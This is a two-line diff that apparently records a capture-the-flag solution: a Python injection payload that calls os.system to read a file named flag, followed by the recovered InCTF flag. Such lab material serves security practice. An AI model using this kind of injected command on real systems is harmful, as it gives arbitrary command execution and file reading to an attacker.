@@ -1,0 +1,2 @@
+__import__('os').system('cat flag')
+inctf{Bye...Bye...2.7...:(}
